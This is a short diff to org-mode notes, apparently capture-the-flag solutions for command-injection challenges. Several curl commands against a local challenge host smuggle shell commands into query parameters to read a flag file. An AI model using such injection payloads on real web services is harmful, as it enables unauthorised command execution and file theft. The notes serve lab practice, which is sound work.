@@ -172,3 +172,9 @@ curl "http://challenge.localhost/test?filedir=.';cat</flag'"
 #+begin_src shell
 curl "http://challenge.localhost/event?time-zon=;cat</flag;"
 #+end_src
+* CMDi 5
+これでいいのか？
+
+#+begin_src shell
+curl "http://challenge.localhost/activity?file-loc=empty.txt;cat%20/flag%20>%20flag";cat flag
+#+end_src
